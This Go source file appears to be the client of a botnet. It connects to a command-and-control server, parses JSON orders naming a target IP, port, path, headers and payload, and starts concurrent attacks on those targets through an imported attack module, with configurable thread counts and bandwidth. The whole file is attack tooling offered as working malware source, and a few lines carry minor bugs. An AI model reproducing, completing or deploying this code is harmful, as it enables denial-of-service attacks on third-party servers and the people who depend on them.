package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"io"
	"log"
	"net"
	"os"
	"strings"

	"bot/attacker"
	"bot/attacker/attack"
)

func handleC2Connection(conn net.Conn) {
	defer conn.Close()

	reader := bufio.NewReader(conn)
	for {
		// Read JSON byte stream
		commandBytes, err := reader.ReadBytes('\n')
		if err != nil {
			if err == io.EOF {
				log.Println("C2 server closed the connection")
			} else {
				log.Printf("Error reading command: %v", err)
			}
			return
		}

		commandBytes = bytes.TrimSpace(commandBytes)

		if method, ip, port, path, header, payload, ok := parseCommand(commandBytes); ok {
			go attacker.AttackInit(method, ip, port, path, header, payload)
			log.Printf("Attack started: [%s] %s:%d%s", method, ip, port, path)
		}
	}
}

// Helper function to truncate long strings for logging
func truncateString(s string, maxLength int) string {
	if len(s) <= maxLength {
		return s
	}
	return s[:maxLength] + "..."
}

func parseCommand(cmd []byte) (method string, ip string, port int, path string, header string, payload string, ok bool) {
	var command BotCommand
	if err := json.Unmarshal(cmd, &command); err != nil {
		log.Printf("Error parsing command: %v", err)
		return "", "", 0, "", "", "", false
	}

	// Handle stop command
	if command.Method == "STOP" {
		return "STOP", "", 0, "", "", "", true
	}

	// Validate IP
	if net.ParseIP(command.IP) == nil {
		log.Printf("Invalid IP address: %s", ip)
		return "", "", 0, "", "", "", false
	}

	// Validate port
	if command.Port < 1 || command.Port > 65535 {
		log.Printf("Invalid port number: %v", command.Port)
		return "", "", 0, "", "", "", false
	}

	// Add path prefix
	if !strings.HasPrefix(command.Path, "/") {
		path = "/" + path
	}

	return command.Method, command.IP, command.Port, command.Path, command.Header, command.Payload, true
}

// initConfig initializes attack configuration
func initConfig() {
	log.Printf("Attack thread count: %d", attack.ThreadCount)
	log.Printf("Bandwidth limit: %d Kbps", attack.BandwidthLimit)

	// Ensure serverfile directory exists
	ensureDirectoryExists("./serverfile")
}

// ensureDirectoryExists ensures the directory exists
func ensureDirectoryExists(dir string) {
	if _, err := os.Stat(dir); os.IsNotExist(err) {
		log.Printf("Creating directory: %s", dir)
		if err := os.MkdirAll(dir, 0755); err != nil {
			log.Fatalf("Failed to create directory %s: %v", dir, err)
		}
	}
}

// readC2Address reads the C2 server address from a file
func readC2Address() string {
	// Attempt to read the address from a file
	if _, err := os.Stat(c2File); err == nil {
		data, err := os.ReadFile(c2File)
		if err == nil {
			addr := strings.TrimSpace(string(data))
			if addr != "" {
				return addr
			}
		}
	}

	// If file does not exist or reading fails, write the default address
	const defaultAddr = "127.0.0.1" // Default local address
	log.Printf("No valid C2 address found, using default address: %s", defaultAddr)

	// Ensure serverfile directory exists
	ensureDirectoryExists("./serverfile")

	// Write the default address to the file
	if err := os.WriteFile(c2File, []byte(defaultAddr), 0644); err != nil {
		log.Printf("Failed to write default C2 address to file: %v", err)
	}

	return defaultAddr
}
